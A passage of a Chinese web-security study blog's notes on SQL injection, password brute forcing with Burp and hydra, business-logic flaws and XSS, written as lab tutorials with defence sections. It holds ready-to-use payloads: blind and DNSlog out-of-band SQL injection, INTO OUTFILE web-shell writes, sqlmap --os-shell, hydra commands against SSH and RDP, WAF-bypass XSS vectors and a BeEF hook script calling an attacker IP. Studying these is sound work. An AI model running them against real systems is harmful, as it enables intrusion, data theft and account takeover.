-?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
-
-
-猜字段名
-
-a. 判断字段名长度
-?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
-
-示例
-?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1))=4,sleep(5),1)
-
-b. 逐字符猜字段
-?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1),1,1))=110,sleep(5),1)
-
-
-猜表内数据
-
-?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
-
-注解
-
-序号：表 &#x2F; 字段排序，从 0 开始计数
-位数：字符串截取位置
-sleep (5)：条件成立延迟 5 秒响应
-
-
-5. DNSlog 盲注5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
-5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
-
-
-secure_file_priv&#x3D;null 不允许导入导出
-secure_file_priv&#x3D;tmp&#x2F; 只能在tmp目录
-secure_file_priv&#x3D; 无限制
-
-5.3 有权限直接读取
-读取路径：
-
-?id=-1 union select 1,2,3,@@datadir
-
-
-读取文件：
-
-?id=-1 union select 1,2,3,load_file(&#x27;文件完整路径&#x27;)
-
-示例：（\ 转义）
-?id=-1 union select 1,2,3,load_file(&#x27;C:\\phpStudy\\WWW\\config.php&#x27;)
-
-
-写入文件：
-
-?id=-1 union select 1,2,3,&#x27;写入内容&#x27; into outfile &#x27;文件保存路径&#x27;
-
-示例：
-?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\WWW\\shell.php&#x27;?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;
-
-5.4 采用 DNSlog 带外获取http://dnslog.cn/
-实操：点击 Get SubDomain 获取域名 xgikzx.dnslog.cn
-
-查当前库名
-
-?id=1 and load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.获取的域名/123&#x27;))
-
-注入后，点击网站的 Refresh Record 就会返回数据库名。
-
-查表名
-
-// 获取第一张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.获取的域名/123&#x27;))// 获取第二张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.获取的域名/123&#x27;))
-
-
-6. 二次注入6.1 概念二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
-6.2 实战
-碰撞用户，确认用户名 admin 存在
-注册用户名：admin&#39;#
-修改密码时执行SQL：
-
-update users set password=md5(&#x27;123456&#x27;) where name=&#x27;admin&#x27;#&#x27;
-
-admin&#39;#的密码没变，修改的是admin的密码
-
-7. 堆叠注入7.1 概念在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。
-7.2 实战
-获取库名、表名、字段名、数据等信息
-构造攻击语句：
-
-?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
-
-
-三、SQLMap工具运用
-官⽹：https://sqlmap.org/
-作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
-
-1. 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
-
-2. 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
-
-四、SQL注入绕过1. 提交方式更改GET 改 POST
-安全狗（WAF 防御）
-2. 特殊字符绕过database/**/()
-
-3. 参数污染?id=1/**&amp;id=-1 union select 1,2,3,4%23*/
-
-4. 数据库特性绕过/*!44509select*/
-
-
-五、 SQL注入防护
-过滤：限制输入长度、识别拦截 SQL 恶意关键字（如 union、select、or 等）
-
-
-缺点：关键字过滤容易被绕过，不是最可靠手段。
-
-
-转义：把用户输入当做普通文本处理，对单引号&#39;等特殊符号进行转义，破坏注入语法。
-数据库权限控制、敏感数据加密
-
-
-最小权限原则：Web 账号不给高权限，禁止 drop、alter 等高风险操作；
-密码等敏感信息加密存储，就算被拖库也不会直接泄露明文。
-
-
-*预编译（参数化查询）***⭐**最核心、最优方案
-
-
-将 SQL 语句结构和用户输入完全分开，输入永远只被当作参数数据，不会被解析成 SQL 代码，从根源杜绝注入。
-
-
-六、总结
-报错注入是在 union 注入在查询不到的情况下，才使用
-在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>CTF</tag>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>弱口令与命令爆破</title>
-    <url>/2026/06/30/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8E%E5%91%BD%E4%BB%A4%E7%88%86%E7%A0%B4/index/</url>
-    <content><![CDATA[一、弱口令1. 定义复杂度极低、极易被猜到&#x2F;爆破的账号密码，是渗透最常见突破口。
-弱⼝令的来源：
-
-密码设置的⼈员疏忽⼤意，安全意识薄弱，为了⽅便记忆在不同的平台设置简单或同样的密码
-某些管理平台有默认的密码，⽽没有及时的修改密码
-
-2. 危害直接登录后台拿权限、篡改数据、上传木马、接管服务器
-二、密码字典1. 定义字典：存放大量常用账号、密码的文本文件，一行一个，用于弱口令爆破遍历尝试。
-2. 密码字典生成2.1 通用模式基于人类通性和历史数据的概率盲打，获取方式简单，数量众多。
-2.1.1 常见密码
-收录高频弱口令（如 123456、password）。
-包含不同类型的变体，能否破解出完全看运气和字典质量。
-
-2.1.2 默认密码
-各种操作系统、中间件、网络设备安装后的出厂默认密码（如 Tomcat: tomcat/tomcat）。
-
-2.2 定制模式针对特定目标（某人或某企业）的信息生成的定制字典，命中率极高。
-2.2.1 社工信息收集
-自主收集: 通过 FOFA、Google Dorks 等搜索引擎获取资产与人员信息。（有关信息收集的笔记供参考：https://blog.ss0t-hacked.top/2026/information-gathering）
-泄露查询: 使用公开合法渠道（如 https://www.reg007.com/）查验目标信息是否在已知泄露事件中（注意：数据通常不全）。
-
-
-⚠️** 法律与安全红线:** 最好只使用自己收集的公开情报，千万不要私自搭建对外的社工库（严重违法）。
-
-2.2.2 社工字典生成将收集到的碎片信息转化为可用的弱口令字典。
-
-信息组合: 平台原密码、邮箱前缀、QQ号、电话、生日、公司名等。
-规则变形:
-姓名拼音 + 生日后缀（例：zhangsan1990）
-首字母大写 + 特殊符号（例：Zhangsan@2026）
-
-
-本地生成工具: 社⼯字典⽣成 weakpass
-
-三、自动化爆破工具1. bp 爆破1.1 模式：1.1.1 Sniper Attack（狙击手模式）
-字典数：1 个
-爆破点：1 个
-对单个定位点进行爆破，例如单独爆破密码。
-
-1.1.2 Battering Ram Attack
-字典数：1 个
-爆破点：≥2 个
-多点爆破，对多个点位同时爆破，所有爆破点使用同一个字典
-
-1.1.3 Pitchfork Attack
-字典数：2 个（payload1、payload2）
-爆破点：≥2 个
-多点爆破，对多个点位进行同时爆破，每个爆破点都有属于自己字典，平行爆破，一一对应。
-
-1.1.4 Cluster Bomb Attack （集束炸弹）
-字典数：2 个
-变量数：≥2 个
-多点爆破，对多个点位进行同时爆破，每个爆破点都有属于自己字典，双字典全组合，一对多。
-
-1.2 怎么判断爆破成功
-通过响应状态码判断
-通过响应长度
-通过具体响应内容
-
-1.3 配置 bp 爆破的几种情况1.3.1 只知道用户名但不知道密码示例：已知用户名是 admin，但是不知道密码
-
-抓包，发送到 intruder
-
-
-
-
-配置BP爆破
-
-
-
-
-
-
-
-
-判断爆破成功–通过响应状态码判断
-
-
-
-1.3.2 用户名和密码都不知道
-依旧先抓包
-配置 bp 爆破
-
-
-
-
-
-在用户名和密码都未知的情况下，爆破成功率极低，不建议尝试。
-
-使用 bp 验证码爆破（需要拓展插件 xiapao、使用 Cluster Bomb Attack ）
-
-示例：seacms 靶场
-首先安装好靶场，再进入后台管理系统。
-
-
-
-
-http://127.0.0.1/weakpasswd/CMS/upload/4qy2hw
-
-
-
-配置 xiapao 插件
-
-
-
-
-
-
-注意：不要关掉终端页面，否则刚刚访问的网页也会没。
-
-
-往 bp 安装插件
-注意：插件的路径不能有中文。
-
-
-
-
-
-
-
-
-
-
-只有【输出】板块有内容，【错误】里面没有就是安装成功了
-
-
-成功导入插件。
-抓包
-先复制验证码的图像地址：
-http://127.0.0.1/weakpasswd/CMS/upload/include/vdimgck.php
-
-
-
-抓包
-
-
-爆破密码
-
-
-爆破验证码
-
-
-
-
-
-
-
-
-把线程设置为1。
-刚刚复制的图片地址
-xiapao: http://127.0.0.1/weakpasswd/CMS/upload/include/vdimgck.php
-
-
-
-开始攻击
-
-
-2. 九头蛇（hydra）2.1 定义hydra是著名组织thc的⼀款开源的暴力破解密码工具。kali下是默认安装的，几乎⽀持所有协议的在线破解。 密码能否破解，在于字典是否强大以及电脑的性能。、
-2.2 参数
--l login 小写，指定用户名进行破解 
--L file 大写，指定用户的用户名字典 
--p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。 
--P file 大写，用于指定密码字典。 
--e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探 
--M file 指定目标ip列表文件，批量破解。 
--o file 指定结果输出文件 
--f 找到第一对登录名或者密码的时候中止破解。 
--t tasks 同时运行的线程数，默认是16 
--w time 设置最大超时时间，单位秒 -
-v&#x2F;-V 显示详细过程 
--R 恢复爆破（如果破解中断了，下次执行hydra -R &#x2F;path&#x2F;to&#x2F;hydra.restore就可以继续任务。） 
--x 自定义密码生成规则
-
-2.3 使用# 切换root权限sudo su
-
-
-
-# 先进入文件所在目录cd /home/kali/弱口令爆破/passwordDict/
-
-2.3.1 破解 SSH 密码命令：
-hydra -l &lt;已知用户名,例如root或kali&gt; -P &lt;密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; ssh
-
-示例：
-针对 Linux 服务器的默认远程管理端口（22）进行爆破， 拿本机的 kali 账号进行测试。  
-# 先要确定ssh是启动的service ssh restart#指定kali账号 用password.txt文件 使用3个线程，爆破本地的sshhydra -l kali -P top500.txt -t 3 -e ns 127.0.0.1 ssh
-
-
-
-成功拿到 kali 的账号和密码。
-2.3.2 破解 Windows RDP 远程桌面命令：
-hydra -l administrator -P &lt;密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; rdp
-
-
--l administrator: Windows 的最高权限默认管理员账号通常是 administrator（注意拼写）。
-rdp: 指定攻击模块为 Remote Desktop Protocol。
-
-示例：
- 针对 Windows 主机的 3389 端口进行爆破。用同一局域网内的 Windows2003 进行测试。
-靶机 IP：
-
-
-# nmap扫描靶机的3389端口是否开放nmap -p 3389 192.168.23.129hydra -l administrator -P top500.txt -t 3 -e ns 192.168.23.129 rdp
-
-
-
-
-
-成功拿到 Windows2003 的账号和密码。
-2.3.3 破解 MySQL 密码MySQL 端口 3306
-场景 A：已知高权限用户名（如 root），仅爆破密码
-hydra -l root -P &lt;你的密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; mysql
-
-
--l root : 指定单个用户名（小写 l）。
--P dict.txt : 指定密码字典文件（大写 P）。
--t 3 : 线程数设为 3（线程过高容易导致服务拒绝连接）。
--e ns : 附加测试空密码 (null) 和同用户名密码 (same)。
-
-场景 B：用户名和密码均未知（双字典交叉爆破）
-hydra -L &lt;用户名字典路径.txt&gt; -P &lt;密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; mysql
-
-
--L users.txt : 指定用户名字典文件（大写 L）。
-
-2.3.4 破解 HTTP 表单登录（POST）命令：
-hydra -t 3 -l &lt;已知用户名&gt; -P &lt;密码字典路径.txt&gt; -s &lt;目标端口&gt; &lt;目标IP&gt; http-post-form &quot;&lt;表单提交路径&gt;:&lt;POST请求数据，使用^USER^和^PASS^占位&gt;:&lt;失败特征码&gt;&quot;
-
- 格式说明：登录URL:POST参数格式:失败提示字符串
-
-^USER^ 和 ^PASS^ 是 Hydra 的占位符，会自动替换为用户名和字典中的密码
-用户名或密码错误是登录失败时页面返回的提示，Hydra 以此判断登录是否失败
-
-示例：
-hydra -t 3 -l admin -P password.txt -s 80 192.168.0.47 http-post-form &quot;/wz/login.php:user=^USER^&amp;pass=^PASS^:用户名或密码错误&quot;
-
-2.3.5 破解 HTTP 表单登录（GET）hydra -t 3 -l admin -P password.txt -s 80 192.168.209.1 http-get-form &quot;/wz/login.php:user=^USER^&amp;pass=^PASS^:用户名或密码错误&quot;]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>弱口令爆破</category>
-      </categories>
-      <tags>
-        <tag>弱口令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逻辑漏洞</title>
-    <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
-简单理解：就是编程人员的思维逻辑不够严谨造成的漏洞。
-2、逻辑漏洞的危害逻辑漏洞的存在，可能导致系统崩溃、数据泄露、功能异常等问题，严重时甚至可能被黑客利用，对系统安全构成威胁。
-
-二、逻辑漏洞与常见漏洞类型的区别漏洞性质
-逻辑漏洞是由于系统设计中的逻辑错误或缺陷引起的，它们允许攻击者通过非预期的使用方式或操作顺序，规避安全机制或获得未授权的访问。
-其他漏洞是由于系统没有正确验证用户输入的数据，或者编码错误或配置不当引起。
-
-攻击方式和目标
-逻辑漏洞需要攻击者了解应用的业务逻辑，通常利用合法用户身份，通过规避或操纵流程实现攻击目标。
-其他常见漏洞是通过注入恶意代码、操纵输入数据或利用错误配置直接攻击网站应用。
-
-检测方法
-逻辑漏洞通常不会被防火墙等设备检测到，可以逃逸各种防护，难以通过自动化工具或防火墙检测。需要人工审查和业务逻辑分析，通常通过渗透测试和代码审计发现。
-其他漏洞可以容易被自动化扫描工具、防火墙(如WAF,Web应用防火墙)和入侵检测系统(IDS)发现。
-
-
-三、逻辑漏洞的分类逻辑漏洞进行分类的话大致可以分为以下几种类型：
-越权类漏洞越权类漏洞是一种常见的安全漏洞，发生在用户可以访问或执行其权限范围之外的资源或操作。根据用户试图获取的权限类型，越权漏洞可以分为水平越权和垂直越权。
-业务逻辑类漏洞业务逻辑类漏洞是一类与应用程序的业务流程和功能相关的漏洞，发生在应用程序未能正确地实施业务规则或逻辑上出现缺陷，导致攻击者可以利用这些漏洞进行未授权的操作或获取敏感信息。
-流程跳过类漏洞流程跳过类漏洞发生在攻击者通过绕过或跳过应用程序中的某些步骤或检查来达到其目的。利用应用程序在处理流程中未正确验证关键步骤或状态的漏洞，从而使攻击者可以规避验证、授权或其他安全机制。
-
-四、常见的逻辑漏洞1、身份认证安全(1)漏洞产生原因:有些网站对身份认证模块没有做好安全防护，因此导致漏洞产生
-(2)绕过身份认证有以下几种方法:
-暴力破解、撞库(以信息收集找到的凭证作为字典)Cookie&amp;Session类加密
-
-(3)暴力破解测试方法:在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况
-爆破用户名。当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在已知用户名。比如:已知用户名为admin，密码可以进行字典爆破使用一个常用密码。比如 123456 对大量用户进行爆破
-
-修复方法:
-增加验证码，登录失败的时候，变换验证码。(确保验证码不能被工具识别)限制登录频率，例如，5 分钟内登录失败次数超过 5 次则锁定账号 1 小时。二次验证，可以添加手机验证码或邮箱验证码。
-
-基于这一块内容的练习，可以看pikachu靶场中有相关练习：暴力破解、验证码绕过(onserver)、验证码绕过(on client)、token防爆破?
-2、未授权访问&amp;越权漏洞授权的概念：就是对特定资源的读写权限。简单的说，就是你的权限能让你做什么事情，而验证则表示是否真的可以对这些资源进行读写
-未授权访问的概念：就是指用户在没有通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或者文本信息
-越权漏洞的产生：主要是用于开发人员在对数据进行操作时对客户端请求的数据过分相信而遗漏了权限判断
-越权漏洞常发生的位置：修改、重置、找回账户密码、查看、修改其他账户未公开的信息例如个人资料、文件、数据、程序等等，还有与账户关联的一些权限操作
-1. 越权漏洞分类
-水平越权：指相同权限的不同用户可以互相访问举例：两个不同的班级的学生A和B，通过修改请求，A可以任意修改B的个人信息
-垂直越权：指使用权限低的用户可以访问权限较高的用户举例：同一个班级不同权限的老师和学生，通过修改请求，学生可以修改和查看老师的账号信息
-
-越权分类补充：基于用户ID、基于对象ID、基于文件名、权限框架缺陷；包含：同级别用户越权访问修改删除、未认证账户直接访问功能、低权限账号访问高权限功能。同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作，如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。
-2. pikachu 靶场
-2.1 水平越权案例
-使用账号kobe/123456登录，正常查看自身信息链接：http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
-
-修改请求参数，访问其他用户信息：
-http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
-
-
-2.2 垂直越权案例
-使用普通用户pikachu/000000登录，页面仅开放查看权限。
-
-直接访问后台编辑页面：/vul/overpermission/op2/op2_admin_edit.php
-
-
-创建之后，再次查看。
-
-漏洞原因：代码仅校验登录状态，未校验用户权限级别
-$link=connect();!check_op2_login(link))&#123;header(&quot;location:op2_login.php&quot;);exit();
-
-3、数据篡改数据篡改分为两方面:业务一致性安全、业务数据安全
-
-业务一致性安全：账号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改
-业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改
-
-案例1 商品编号篡改步骤:提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功举例：100个积分只能换商品编号为001，1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。
-修复：金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验相关案例: 某积分商城支付漏洞，通过抓包可以修改积分。
-案例2 金额数据篡改（0元购物）步骤: 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。修复：商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值。相关案例: 某订单支付时的总价未验证，抓包将支付金额修改为1即可完成付款。
-案例3 大米CMS支付漏洞5.1 直接修改商品价格购买流程分为订购、确认信息、付款三步，可在任意一步抓包修改价格；可尝试修改为小额、负数金额测试漏洞。案例：http://wooyun.2xss.cc/bug_detail.php?wybug_id&#x3D;wooyun-2016-0226613
-5.2 修改支付状态
-字段规则：0代表支付成功，1代表支付失败；未付款时抓包将状态1改为0，绕过付款步骤。
-数据包复用：低价商品请求包复用至高价商品，实现低价购买高价商品。
-
-5.3 修改商品数量示例：单个商品售价10元，抓包修改数量字段qty，改为大数会生成高额订单，改为负数可实现负金额订单。
-4、任意密码重置漏洞概念：任意密码重置漏洞是系统设计缺陷，允许攻击者在未经授权的情况下更改其他用户的密码。
-漏洞常见场景：缺乏身份验证、不安全的重置链接、安全问题或验证码的缺陷以及会话固定攻击。
-案例：抓包修改请求内用户ID，即可篡改其他用户密码，请求示例：
-[id:1,&#x27;password&#x27;admin12345&quot;)
-
-
-五、逻辑漏洞总结1. 经典业务逻辑漏洞案例
-美团APP忘记密码：仅校验手机号+出生年月日身份证片段，存在绕过风险
-网易黑胶VIP首次充值漏洞：多设备复用首次充值优惠，重复享受低价福利
-
-2. 历史公开漏洞（1）支付逻辑漏洞
-客户端直接篡改支付金额
-订单数量无负数限制，实现0元购、负数金额订单
-请求重放、参数篡改实现余额倍增、免费下单
-团购、充值类订单参数可篡改
-
-（2）密码找回&#x2F;修改逻辑漏洞
-暴力破解用户凭证
-找回链接、页面泄露用户信息
-验证码、Token设计缺陷，可通用&#x2F;预测
-越权修改任意账号密码
-找回流程、验证步骤可绕过
-
-（3）应用程序逻辑错误
-绕过交易限制、刷取账户余额
-Cookie&#x2F;Session设计缺陷导致任意账号登录
-强制浏览、流程顺序缺陷，遍历数据
-时间校验缺陷（如12306刷票）
-
-（4）越权分类
-新增数据越权
-删除数据越权（如删除他人素材）
-修改数据越权（篡改用户信息）
-查询数据越权（批量泄露信息）
-URL&#x2F;参数越权
-
-（5）验证码安全问题
-客户端实现、可直接绕过&#x2F;爆破
-服务端验证码可重复使用、可预测
-万能验证码、验证码在请求包明文展示
-验证码强度低，可被OCR识别
-无次数、时效限制，可无限爆破
-
-（6）JS敏感信息泄露
-JS文件泄露后台路径、接口API
-前端JS窃取受保护Cookie
-AJAX、前端脚本泄露手机号、邮箱等隐私
-
-3. 逻辑漏洞分类梳理（1）交易类
-修改支付价格
-修改支付状态
-修改&#x2F;负数化购买数量
-篡改金额为负数
-请求重放攻击
-数据库并发锁处理不当
-
-（2）业务风控类
-刷取优惠券、重复享受优惠
-套现类漏洞
-
-（3）账号注册类
-重复注册、账号覆盖
-用户名遍历猜解
-
-（4）密码相关
-密码明文存储、未做哈希加密
-无密码强度校验
-
-（5）账号信息类
-用户名&#x2F;邮箱前后空格、大小写处理不当
-手机号格式校验缺陷（如+86前缀绕过）
-
-（6）Cookie&#x2F;Session类
-Cookie存储敏感数据
-Cookie&#x2F;Session可伪造、无合法性校验
-
-（7）登录类
-撞库攻击
-账号劫持
-恶意锁号（无解锁机制）
-传输信道不安全
-凭证本地不安全存储
-
-（8）密码找回类
-越权重置任意密码
-新密码在响应包明文返回
-Token前端可控、无服务端强校验
-头部字段处理不当引发漏洞
-找回流程泄露敏感信息
-
-（9）修改密码类
-越权修改他人密码
-无需验证旧密码即可改密
-
-（10）申诉类
-身份伪造
-申诉流程绕过
-
-（11）信息查询&#x2F;更新类
-越权查询、修改数据
-ID可枚举，批量遍历用户数据
-
-（12）双因素认证(2FA)漏洞
-改密&#x2F;登录后自动跳过二次验证
-OAuth登录未开启2FA
-2FA验证码可爆破、存在竞争条件
-返回值篡改绕过
-链接、功能可绕过2FA
-CSRF攻击禁用2FA
-
-（13）验证码漏洞汇总
-可重用、可预测、无时效&#x2F;次数限制
-客户端生成&#x2F;校验、前端直接绕过
-数据包明文展示验证码
-强度低可被机器识别
-特殊参数绕过、可用于短信&#x2F;邮件轰炸
-
-（14）Session漏洞
-Session可猜测、伪造、泄露
-Session固定攻击
-
-（15）越权细分
-未授权访问
-水平越权（同权限用户互访）
-垂直越权（低权限访问高权限）
-交叉越权
-
-（16）其他漏洞
-ID、随机数生成规则简单，可枚举&#x2F;预测
-接口无访问次数、权限限制
-加密算法误用
-业务执行顺序缺陷
-各类敏感信息泄露
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>逻辑漏洞</category>
-      </categories>
-      <tags>
-        <tag>逻辑漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS漏洞</title>
-    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、XSS简介与危害1. 定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-2. 危害
-盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
-控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
-盗窃企业重要的具有商业价值的资料
-非法转账
-强制发送电子邮件
-网站挂马
-控制受害者机器向其它网站发起攻击（重定向语句）
-窃取cookie的sessionid，冒充登录
-
-
-二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
-1. 反射型1.1 反射型流程
-黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
-客户端向URL对应的服务器发出请求
-服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
-客户端解析代码，恶意代码随之执行
-
-
-
-1.2 案例1.2.1 编写代码把 php 文件放在 phpstudy 的 www 目录下
-&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
-
-访问
-?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-
-1.2.2 fofa搜索命令&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
-
-
-
-
-
-进入 pikachu 靶场
-如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
-pikachu靶场：反射型XSS 练习
-
-反射型xss
-
-
-
-先输入 1 测试
-
-
-输入恶意代码
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-方法一：
-直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
-
-
-
-
-
-方法二：
-直接在输入框里输入恶意代码，但是我们发现会有长度限制：
-
-
-F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
-
-
-
-
-注意：改完之后不要刷新，不然又会恢复 20。
-
-
-总结：输入框长度限制可通过修改URL或F12改前端代码绕过
-
-2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
-以 pikachu 靶场为例：
-
-
-传入一个恶意代码
-&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-
-只要刷新这个页面，就会重复出现这句话。
-
-3. DOM型3.1 流程
-黑客诱导用户点击恶意URL
-
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-客户端直接执行攻击代码，无需与服务器交互
-攻击纯粹发生在客户端
-
-
-
-以 pikachu 靶场为例：
-
-
-先输入 1 测试一下
-
-
-传入一个恶意代码：
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-
-点击之后：
-
-
-
-三、BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
-BeEF是Kali自带的XSS利用工具，基于Ruby开发。
-
-
-1. 核心信息
-Web UI：http://127.0.0.1:3000/ui/panel
-Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-2. 攻击流程
-启动 BeEF
-
-beef-xss-start
-
-
-
-账号：beef** ，**我设置的密码是 kali
-
-
-
-黑客（Kali）IP 放入 Hook 代码中
-
-# 查看 IPifconfig
-
-
-
-&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-
-注入Hook代码到表单提交入库
-
-
-
-
-受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
-
-
-
-
-四、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
-http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
-
-2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
-2.1 手工绕过–标签语法替换
-audio标签
-
-&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
-
-
-video标签
-
-&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
-
-
-button标签
-
-&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
-
-2.2 加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
-
-3. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
-3.1 常用参数XSStrike
--h, --help显示帮助信息
--u, --url指定目标 URL
---dataPOST 方式提交内容
--v, --verbose详细输出
--f, --file加载自定义 payload 字典
--t, --threads定义线程数
--l, --level爬行深度
--t, --encode定义 payload 编码方式
---json将 POST 数据视为 JSON
---path测试 URL 路径组件
